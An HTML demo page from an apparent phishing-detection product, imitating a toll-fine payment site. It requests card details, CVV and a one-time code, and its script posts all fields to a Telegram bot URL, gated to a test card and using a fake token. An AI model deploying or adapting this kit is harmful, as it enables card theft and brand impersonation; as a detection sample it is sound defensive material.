<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Toll fine, payment due today</title>
<!-- Kits hot-link the real brand's own tab icon. Veto matches it against the brand's official icon fingerprints. -->
<link rel="icon" href="https://www.salik.ae/content/img/ico/favicon-32x32.png">
<style>
  body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #f1f4f8; color: #1d2a3a; }
  header { background: #1b2a4a; color: #fff; padding: 14px 18px; font-weight: bold; font-size: 17px; }
  main { max-width: 420px; margin: 18px auto; background: #fff; border-radius: 10px; padding: 18px; box-shadow: 0 2px 10px rgba(0,0,0,.08); }
  .fine { background: #fdecec; border: 1px solid #f5b5b5; padding: 10px; border-radius: 6px; font-size: 14px; margin-bottom: 14px; }
  .amt { font-size: 28px; font-weight: bold; margin: 8px 0 14px; }
  label { display: block; font-size: 13px; margin: 10px 0 4px; color: #44546a; }
  input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #c9d3df; border-radius: 6px; font-size: 15px; }
  .row { display: flex; gap: 10px; } .row > div { flex: 1; }
  button { margin-top: 16px; width: 100%; padding: 12px; border: 0; border-radius: 6px; background: #1b2a4a; color: #fff; font-size: 16px; }
  footer { text-align: center; font-size: 11px; color: #8a97a8; margin: 18px; }
</style>
</head>
<body>
<header>🚗 Toll Gate Fines · Online Payment</header>
<main>
  <div class="fine">Unpaid toll gate fine for your vehicle. Pay <b>today</b> to avoid a AED 400 penalty and a vehicle block.</div>
  <div class="amt">AED 50.00</div>
  <form action="#">
    <label for="plate">Plate number</label><input id="plate" name="plate">
    <label for="card">Card number</label><input id="card" name="card_number" autocomplete="cc-number" maxlength="19">
    <div class="row">
      <div><label for="exp">Expiry</label><input id="exp" name="expiry" autocomplete="cc-exp" placeholder="MM/YY"></div>
      <div><label for="cvv">CVV</label><input id="cvv" name="cvv" autocomplete="cc-csc" maxlength="3"></div>
    </div>
    <label for="otp">OTP sent to your mobile</label><input id="otp" name="otp" autocomplete="one-time-code" maxlength="6">
    <button type="submit">Pay fine</button>
    <p id="done" hidden>DEMO. Nothing you type here is sent anywhere.</p>
  </form>
</main>
<footer>VETO.AI DEMO PAGE · shown only to phones (cloaking demo) · it collects nothing</footer>
<script>
// Same operation as the bank and parcel demo pages: the SAME Telegram bot (fake token) and analytics ID.
// DEMO SAFETY: the send only happens for the public test card 4111 1111 1111 1111 that the X-ray types, then blocks.
var BOT = 'https://api.telegram.org/bot7012345678:AAH-veto-demo-token-not-real-000000/sendMessage';
window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('config', 'G-VT7DEMO2026');
document.querySelector('form').addEventListener('submit', function (e) {
  e.preventDefault();
  if (/^4111/.test(document.getElementById('card').value.replace(/\D/g, ''))) {
    var data = Array.prototype.map.call(document.querySelectorAll('input'), function (i) { return i.name + ': ' + i.value; }).join('\n');
    fetch(BOT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: '-1000000000000', text: data }) }).catch(function () {});
  }
  document.getElementById('done').hidden = false;
});
</script>
</body>
</html>
